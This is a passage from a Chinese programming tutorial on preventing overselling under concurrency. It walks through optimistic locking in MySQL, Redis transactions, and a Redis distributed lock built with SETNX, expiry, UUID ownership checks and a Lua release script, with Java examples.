<code>version</code> 是否等于之前查出来的</p><p> . 若等于，则更新库存操作成功</p><p> . 否则，则说明存在并发操作，该条库存数据已被修改。继续查询重试</p> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">UPDATE</span> db_stock <span class="hljs-keyword">SET</span> count<span class="hljs-operator">=</span><span class="hljs-number">4999</span>, version<span class="hljs-operator">=</span>version<span class="hljs-operator">+</span><span class="hljs-number">1</span> <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">AND</span> version<span class="hljs-operator">=</span><span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure></li></ol><h4 id="1-5-2-代码实现"><a href="#1-5-2-代码实现" class="headerlink" title="1.5.2 代码实现"></a>1.5.2 代码实现</h4><p>在 Stock 实体类中添加 <code>version</code> 属性，类型为Integer</p><p>修改 StcokService 中的deduct()方法</p><h5 id="第一版代码"><a href="#第一版代码" class="headerlink" title="第一版代码"></a>第一版代码</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Transactional</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deduct</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-comment">// 查询库存信息并锁定</span><br>    List&lt;Stock&gt; stocks = <span class="hljs-built_in">this</span>.stockMapper.selectList(<span class="hljs-keyword">new</span> <span class="hljs-title class_">QueryWrapper</span>&lt;Stock&gt;().eq(<span class="hljs-string">&quot;product_code&quot;</span>, <span class="hljs-string">&quot;1001&quot;</span>));<br>    <span class="hljs-comment">// 取第一个库存</span><br>    <span class="hljs-type">Stock</span> <span class="hljs-variable">stock</span> <span class="hljs-operator">=</span> stocks.get(<span class="hljs-number">0</span>);<br>    <span class="hljs-comment">// 判断库存是否充足</span><br>    <span class="hljs-keyword">if</span> (stock != <span class="hljs-literal">null</span> &amp;&amp; stock.getCount() &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-comment">// 扣减库存</span><br>        stock.setCount(stock.getCount() - <span class="hljs-number">1</span>);<br>        <span class="hljs-type">Integer</span> <span class="hljs-variable">version</span> <span class="hljs-operator">=</span> stock.getVersion();<br>        stock.setVersion(version + <span class="hljs-number">1</span>);<br>        <span class="hljs-type">int</span> <span class="hljs-variable">update</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.stockMapper.update(stock, <span class="hljs-keyword">new</span> <span class="hljs-title class_">UpdateWrapper</span>&lt;Stock&gt;().eq(<span class="hljs-string">&quot;id&quot;</span>, stock.getId()).eq(<span class="hljs-string">&quot;version&quot;</span>, version));<br>        <span class="hljs-keyword">if</span> (update == <span class="hljs-number">0</span>) &#123;<br>            deduct();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>采用JMeter压力测试工具测试时，报错</p><p>错误分析：</p><ol><li><p>stack over flow：栈溢出</p><p> <img src="https://lty-image-bed.oss-cn-shenzhen.aliyuncs.com/blog/stackoverflow.png"></p><p> 这是由于高并发的情况下，更新失败率很高，就会不断地递归调用deduct方法，导致栈溢出。</p><p> 解决方案：调用线程类中的sleep方法，暂时睡眠，避开并发高峰</p></li><li><p>连接超时错误</p><p> <img src="https://lty-image-bed.oss-cn-shenzhen.aliyuncs.com/blog/timeout.png"></p><p> 这是由于开启了事务注解，为手动事务。</p><p> 当执行到更新操作时，会对数据进行加锁。而当前请求无法更新，就会一直调用deduct方法，并一直持有锁。其他请求进入代码，会进入阻塞状态，直至连接超时。</p><p> 而关闭了事务注解，为自动事务。若更新操作执行失败，会放弃锁。</p></li></ol><h5 id="最终代码"><a href="#最终代码" class="headerlink" title="最终代码"></a>最终代码</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deduct</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-comment">// 查询库存信息并锁定</span><br>    List&lt;Stock&gt; stocks = <span class="hljs-built_in">this</span>.stockMapper.selectList(<span class="hljs-keyword">new</span> <span class="hljs-title class_">QueryWrapper</span>&lt;Stock&gt;().eq(<span class="hljs-string">&quot;product_code&quot;</span>, <span class="hljs-string">&quot;1001&quot;</span>));<br>    <span class="hljs-comment">// 取第一个库存</span><br>    <span class="hljs-type">Stock</span> <span class="hljs-variable">stock</span> <span class="hljs-operator">=</span> stocks.get(<span class="hljs-number">0</span>);<br>    <span class="hljs-comment">// 判断库存是否充足</span><br>    <span class="hljs-keyword">if</span> (stock != <span class="hljs-literal">null</span> &amp;&amp; stock.getCount() &gt; <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-comment">// 扣减库存</span><br>        stock.setCount(stock.getCount() - <span class="hljs-number">1</span>);<br>        <span class="hljs-type">Integer</span> <span class="hljs-variable">version</span> <span class="hljs-operator">=</span> stock.getVersion();<br>        stock.setVersion(version + <span class="hljs-number">1</span>);<br>        <span class="hljs-type">int</span> <span class="hljs-variable">update</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.stockMapper.update(stock, <span class="hljs-keyword">new</span> <span class="hljs-title class_">UpdateWrapper</span>&lt;Stock&gt;().eq(<span class="hljs-string">&quot;id&quot;</span>, stock.getId()).eq(<span class="hljs-string">&quot;version&quot;</span>, version));<br>        <span class="hljs-keyword">if</span> (update == <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-keyword">try</span> &#123;<br>                Thread.sleep(<span class="hljs-number">20</span>);<br>            &#125; <span class="hljs-keyword">catch</span> (InterruptedException e) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>            &#125;<br>            deduct();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>通过JMeter测试，最终库存减为0</p><h4 id="1-5-3-优缺点"><a href="#1-5-3-优缺点" class="headerlink" title="1.5.3 优缺点"></a>1.5.3 优缺点</h4><p>推荐阅读：<a href="https://www.cnblogs.com/qjjazry/p/6581568.html">Java并发问题–乐观锁与悲观锁以及乐观锁的一种实现方式-CAS</a></p><p>优点：</p><ol><li>乐观锁在竞争不激烈时，较悲观锁更具有优势，因为悲观锁会锁住代码块，并且加锁、释放锁、线程上下文均占用额外资源。</li></ol><p>缺点：</p><ol><li><p>在高并发情况下，乐观锁的性能不如悲观锁，因为重试次数过多。</p></li><li><p>乐观锁存在ABA问题</p><p> . 在查询与更新的中间，<code>X</code> 值被多次更改，但最终又回到了查询时的值</p></li><li><p>读写分离情况下，乐观锁不可靠</p><p> 从数据库与主数据库进行网络传输，具有较大时延，可能主数据库内是新数据，而从数据库内是旧数据，乐观锁下会造成从数据库不断地重试，</p></li></ol><h3 id="1-6-MySQL锁总结"><a href="#1-6-MySQL锁总结" class="headerlink" title="1.6 MySQL锁总结"></a>1.6 MySQL锁总结</h3><p>性能：单SQL语句 &gt; 悲观锁 &gt; JVM锁 &gt; 乐观锁</p><ul><li><p>追求极致性能、业务场景简单、无需记录数据更新前后变化的情况下 -&gt; 单SQL语句</p></li><li><p>并发量低、读多于写、竞争不激烈的情况下 -&gt; 乐观锁</p></li><li><p>并发量高、冲突激烈 -&gt; 悲观锁</p></li><li><p>不推荐JVM锁</p></li></ul><h3 id="1-7-Redis锁"><a href="#1-7-Redis锁" class="headerlink" title="1.7 Redis锁"></a>1.7 Redis锁</h3><h4 id="1-7-1-并发问题引入"><a href="#1-7-1-并发问题引入" class="headerlink" title="1.7.1 并发问题引入"></a>1.7.1 并发问题引入</h4><ol><li><p>在Maven工程pom.xml文件中加入依赖</p> <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-data-redis<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure></li><li><p>在application.properties文件中配置redis</p> <figure class="highlight properties"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs properties"><span class="hljs-attr">spring.redis.host</span>=<span class="hljs-string">localhost</span><br><span class="hljs-attr">spring.redis.password</span>=<span class="hljs-string">123456</span><br></code></pre></td></tr></table></figure></li><li><p>更改 StockService类中的deduct方法</p><p> 采用StringRedisTemplate更加方便</p><p> 而RedisTemplate需要手动设置序列化器</p> <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Autowired</span><br><span class="hljs-keyword">private</span> StringRedisTemplate redisTemplate;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deduct</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-comment">// 查询库存信息</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">stock</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.redisTemplate.opsForValue().get(<span class="hljs-string">&quot;stock&quot;</span>);<br>    <span class="hljs-comment">// 判断库存是否充足</span><br>    <span class="hljs-keyword">if</span> (stock != <span class="hljs-literal">null</span> &amp;&amp; stock.length() != <span class="hljs-number">0</span>) &#123;<br>        <span class="hljs-type">Integer</span> <span class="hljs-variable">st</span> <span class="hljs-operator">=</span> Integer.valueOf(stock);<br>        <span class="hljs-keyword">if</span> (st &gt; <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-comment">// 扣减库存</span><br>            <span class="hljs-built_in">this</span>.redisTemplate.opsForValue().set(<span class="hljs-string">&quot;stock&quot;</span>, String.valueOf(--st));<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p>在redis-cli命令窗口中，设置库存：<code>set stock 5000</code></p></li></ol><p>启动SpringBoot与压力测试工具JMeter，最终库存不为0，出现并发问题。</p><h4 id="1-7-2-解决方案"><a href="#1-7-2-解决方案" class="headerlink" title="1.7.2 解决方案"></a>1.7.2 解决方案</h4><ol><li><p>JVM本地锁机制（较简单不做演示）</p></li><li><p>Redis乐观锁：<code>watch</code> <code>multi</code> <code>exec</code></p><ol><li><p>watch：监控一个或多个key的值，如果exec执行之前，如果key的值发生变化，则取消事务执行。</p></li><li><p>multi：开启事务</p></li><li><p>exec：执行事务</p></li></ol></li></ol><h4 id="1-7-3-代码实现"><a href="#1-7-3-代码实现" class="headerlink" title="1.7.3 代码实现"></a>1.7.3 代码实现</h4><p>修改StockService中的deduct方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deduct</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">this</span>.redisTemplate.execute(<span class="hljs-keyword">new</span> <span class="hljs-title class_">SessionCallback</span>&lt;Object&gt;() &#123;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">execute</span><span class="hljs-params">(RedisOperations operations)</span> <span class="hljs-keyword">throws</span> DataAccessException &#123;<br>            operations.watch(<span class="hljs-string">&quot;stock&quot;</span>);<br>            <span class="hljs-comment">// 查询库存信息</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">stock</span> <span class="hljs-operator">=</span> operations.opsForValue().get(<span class="hljs-string">&quot;stock&quot;</span>).toString();<br>            <span class="hljs-comment">// 判断库存是否充足</span><br>            <span class="hljs-keyword">if</span> (stock != <span class="hljs-literal">null</span> &amp;&amp; stock.length() != <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-type">Integer</span> <span class="hljs-variable">st</span> <span class="hljs-operator">=</span> Integer.valueOf(stock);<br>                <span class="hljs-keyword">if</span> (st &gt; <span class="hljs-number">0</span>) &#123;<br>                    <span class="hljs-comment">// multi</span><br>                    operations.multi();<br>                    <span class="hljs-comment">// 扣减库存</span><br>                    operations.opsForValue().set(<span class="hljs-string">&quot;stock&quot;</span>, String.valueOf(--st));<br>                    <span class="hljs-comment">// exec 执行事务</span><br>                    <span class="hljs-type">List</span> <span class="hljs-variable">exec</span> <span class="hljs-operator">=</span> operations.exec();<br>                    <span class="hljs-comment">// 如果事务执行结果为空，代表操作失败，重试</span><br>                    <span class="hljs-keyword">if</span> (exec == <span class="hljs-literal">null</span> || exec.size() == <span class="hljs-number">0</span>) &#123;<br>                        <span class="hljs-keyword">try</span> &#123;<br>                            Thread.sleep(<span class="hljs-number">40</span>);<br>                        &#125; <span class="hljs-keyword">catch</span> (InterruptedException e) &#123;<br>                            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>                        &#125;<br>                        deduct();<br>                    &#125;<br>                    <span class="hljs-keyword">return</span> exec;<br>                &#125;<br>            &#125;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>    &#125;);<br>&#125;<br></code></pre></td></tr></table></figure><p>采用JMeter进行并发测试后，库存减为0，解决了并发问题</p><p>但是吞吐量性能较低，甚至可能由于电脑性能问题，出现连接不够用的情况。</p><h2 id="2-Redis分布式锁"><a href="#2-Redis分布式锁" class="headerlink" title="2. Redis分布式锁"></a>2. Redis分布式锁</h2><h3 id="2-1-实现思路"><a href="#2-1-实现思路" class="headerlink" title="2.1 实现思路"></a>2.1 实现思路</h3><p>借助于redis中的命令 <code>setnx(key, value)</code></p><p>设置 <code>key</code> 为lock</p><ul><li>若 <code>lock</code> 存在，则说明有其他请求已经获取到锁，则当前请求重复重试</li><li>若 <code>lock</code> 不存在，则说明当前锁未被获取，当前请求获取锁成功，继续执行业务操作</li><li>设置 <code>lock</code> 之后，只有一个请求可以获取到锁并执行成功，其他请求只能等待</li></ul><p><img src="https://lty-image-bed.oss-cn-shenzhen.aliyuncs.com/blog/1606626611922.png"></p><h3 id="2-2-基本代码实现"><a href="#2-2-基本代码实现" class="headerlink" title="2.2 基本代码实现"></a>2.2 基本代码实现</h3><h4 id="2-2-1-递归版本"><a href="#2-2-1-递归版本" class="headerlink" title="2.2.1 递归版本"></a>2.2.1 递归版本</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deduct</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-comment">// 加锁setnx</span><br>    <span class="hljs-type">Boolean</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-built_in">this</span>.redisTemplate.opsForValue().setIfAbsent(<span class="hljs-string">&quot;lock&quot;</span>, <span class="hljs-string">&quot;123&quot;</span>);<br>    <span class="hljs-comment">// 递归调用</span><br>    <span class="hljs-keyword">if</span> (!lock) &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            Thread.sleep(<span class="hljs-number">50</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (InterruptedException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br>        deduct();<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// 查询库存信息</span><br>            <span class="hljs-type">String</span> <span class="hljs-variable">stock</span> <span class="hljs-operator">=</span> redisTemplate.opsForValue().get(<span class="hljs-string">&quot;stock&quot;</span>).toString();<br>            <span class="hljs-comment">// 判断库存是否充足</span><br>            <span class="hljs-keyword">if</span> (stock != <span class="hljs-literal">null</span> &amp;&amp; stock.length() != <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-type">Integer</span> <span class="hljs-variable">st</span> <span class="hljs-operator">=</span> Integer.valueOf(stock);<br>                <span class="hljs-keyword">if</span> (st &gt; <span class="hljs-number">0</span>) &#123;<br>                    <span class="hljs-comment">// 扣减库存</span><br>                    redisTemplate.opsForValue().set(<span class="hljs-string">&quot;stock&quot;</span>, String.valueOf(--st));<br>                &#125;<br>            &#125;<br>        &#125; <span class="hljs-keyword">finally</span> &#123;<br>            <span class="hljs-comment">// 解锁</span><br>            <span class="hljs-built_in">this</span>.redisTemplate.delete(<span class="hljs-string">&quot;lock&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="2-2-2-循环版本"><a href="#2-2-2-循环版本" class="headerlink" title="2.2.2 循环版本"></a>2.2.2 循环版本</h4><p>注意：即使不采用递归版本，在重试获取锁的过程中，也可以使用线程睡眠，这样可以减小锁的竞争压力，提升性能</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deduct</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-comment">// 加锁setnx</span><br>    <span class="hljs-keyword">while</span> (!<span class="hljs-built_in">this</span>.redisTemplate.opsForValue().setIfAbsent(<span class="hljs-string">&quot;lock&quot;</span>, <span class="hljs-string">&quot;123&quot;</span>)) &#123;<br>        <span class="hljs-comment">// 循环重试</span><br>        <span class="hljs-keyword">try</span> &#123;<br>            Thread.sleep(<span class="hljs-number">50</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (InterruptedException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-comment">// 查询库存信息</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">stock</span> <span class="hljs-operator">=</span> redisTemplate.opsForValue().get(<span class="hljs-string">&quot;stock&quot;</span>).toString();<br>        <span class="hljs-comment">// 判断库存是否充足</span><br>        <span class="hljs-keyword">if</span> (stock != <span class="hljs-literal">null</span> &amp;&amp; stock.length() != <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-type">Integer</span> <span class="hljs-variable">st</span> <span class="hljs-operator">=</span> Integer.valueOf(stock);<br>            <span class="hljs-keyword">if</span> (st &gt; <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-comment">// 扣减库存</span><br>                redisTemplate.opsForValue().set(<span class="hljs-string">&quot;stock&quot;</span>, String.valueOf(--st));<br>            &#125;<br>        &#125;<br>    &#125; <span class="hljs-keyword">finally</span> &#123;<br>        <span class="hljs-comment">// 解锁</span><br>        <span class="hljs-built_in">this</span>.redisTemplate.delete(<span class="hljs-string">&quot;lock&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="2-3-问题解决"><a href="#2-3-问题解决" class="headerlink" title="2.3 问题解决"></a>2.3 问题解决</h3><h4 id="2-3-1-死锁与原子性"><a href="#2-3-1-死锁与原子性" class="headerlink" title="2.3.1 死锁与原子性"></a>2.3.1 死锁与原子性</h4><p>在某一请求获取到lock锁之后，当前服务器突然宕机，造成该锁无法得到释放，此时其他请求仍然处于不断地递归或循环重试获取锁，造成死循环。</p><p>解决方案：获取到lock之后，为lock设置过期时间，<code>expire</code> 指令</p><p>但是：可能在 获取lock 与 为lock设置过期时间 之间，服务器发生宕机。</p><p>因此，需要确保两个操作的原子性：采用如下指令，将多个操作复合到一个指令中</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">set</span> lock <span class="hljs-number">123</span> ex <span class="hljs-number">20</span> nx<br></code></pre></td></tr></table></figure><p>修改加锁部分的代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">while</span> (!<span class="hljs-built_in">this</span>.redisTemplate.opsForValue().setIfAbsent(<span class="hljs-string">&quot;lock&quot;</span>, <span class="hljs-string">&quot;123&quot;</span>, <span class="hljs-number">3</span>, TimeUnit.SECONDS)) &#123;<br>    <span class="hljs-comment">// 循环重试</span><br>    <span class="hljs-keyword">try</span> &#123;<br>        Thread.sleep(<span class="hljs-number">50</span>);<br>    &#125; <span class="hljs-keyword">catch</span> (InterruptedException e) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="2-3-2-防误删"><a href="#2-3-2-防误删" class="headerlink" title="2.3.2 防误删"></a>2.3.2 防误删</h4><p>假设处理请求的时长大于锁的有效时间，当某一请求还未执行完当前操作时，Redis锁便会自动释放掉（删除lock），等到该请求执行完当前操作后，还会手动地将Redis锁释放掉。此时，可能别的请求已经获取到了锁，那么该锁很有可能被该请求误删掉。</p><p><strong>解决方案：</strong></p><p>为了防止出现这一情况，需要为当前锁设置唯一标识UUID，作为锁的值。</p><p>在删除锁之前，先判断当前锁是否属于自己，然后再进行删除。</p><p>修改 StockService 的 deduct方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">deduct</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-type">String</span> <span class="hljs-variable">uuid</span> <span class="hljs-operator">=</span> UUID.randomUUID().toString();<br>    <span class="hljs-comment">// 加锁setnx</span><br>    <span class="hljs-keyword">while</span> (!<span class="hljs-built_in">this</span>.redisTemplate.opsForValue().setIfAbsent(<span class="hljs-string">&quot;lock&quot;</span>, uuid, <span class="hljs-number">3</span>, TimeUnit.SECONDS)) &#123;<br>        <span class="hljs-comment">// 循环重试</span><br>        <span class="hljs-keyword">try</span> &#123;<br>            Thread.sleep(<span class="hljs-number">50</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (InterruptedException e) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>(e);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-comment">// 查询库存信息</span><br>        <span class="hljs-type">String</span> <span class="hljs-variable">stock</span> <span class="hljs-operator">=</span> redisTemplate.opsForValue().get(<span class="hljs-string">&quot;stock&quot;</span>).toString();<br>        <span class="hljs-comment">// 判断库存是否充足</span><br>        <span class="hljs-keyword">if</span> (stock != <span class="hljs-literal">null</span> &amp;&amp; stock.length() != <span class="hljs-number">0</span>) &#123;<br>            <span class="hljs-type">Integer</span> <span class="hljs-variable">st</span> <span class="hljs-operator">=</span> Integer.valueOf(stock);<br>            <span class="hljs-keyword">if</span> (st &gt; <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-comment">// 扣减库存</span><br>                redisTemplate.opsForValue().set(<span class="hljs-string">&quot;stock&quot;</span>, String.valueOf(--st));<br>            &#125;<br>        &#125;<br>    &#125; <span class="hljs-keyword">finally</span> &#123;<br>        <span class="hljs-comment">// 先判断，再解锁</span><br>        <span class="hljs-keyword">if</span> (StringUtils.equals(<span class="hljs-built_in">this</span>.redisTemplate.opsForValue().get(<span class="hljs-string">&quot;lock&quot;</span>), uuid)) &#123;<br>            <span class="hljs-built_in">this</span>.redisTemplate.delete(<span class="hljs-string">&quot;lock&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>判断与删除操作需要保证原子性，否则还会出现并发问题</p><ul><li>刚判断完该锁是自己的，还没进行删除，锁就到期自动释放且被其他请求获取，此时会造成误删操作</li></ul><p>借助 <code>lua</code> 脚本实现原子性操作：<a href="https://www.runoob.com/lua/lua-tutorial.html">Lua 教程 | 菜鸟教程</a></p><p>redis-cli支持lua脚本，可以一次性给redis发送多个指令。</p><ul><li>redis为单线程，执行指令遵守 <code>one-by-one</code> 规则</li></ul><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs inform7">EVAL script numkeys <span class="hljs-comment">[key <span class="hljs-comment">[key ...]</span>]</span> <span class="hljs-comment">[arg <span class="hljs-comment">[arg ...]</span>]</span><br></code></pre></td></tr></table></figure><p>删除LUA脚本：</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lua"><span class="hljs-keyword">if</span> redis.call(<span class="hljs-string">&#x27;get&#x27;</span>, KEYS[<span class="hljs-number">1</span>]) == ARGV[<span class="hljs-number">1</span>] <span class="hljs-keyword">then</span> <span class="hljs-keyword">return</span> redis.call(<span class="hljs-string">&#x27;del&#x27;</span>, KEYS[<span class="hljs-number">1</span>]) <span class="hljs-keyword">else</span> <span class="hljs-keyword">return</span> <span class="hljs-number">0</span> <span class="hljs-keyword">end</span><br></code></pre></td></tr></table></figure><p>更改代码中finally部分</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 先判断，再解锁</span><br><span class="hljs-type">String</span> <span class="hljs-variable">script</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;if 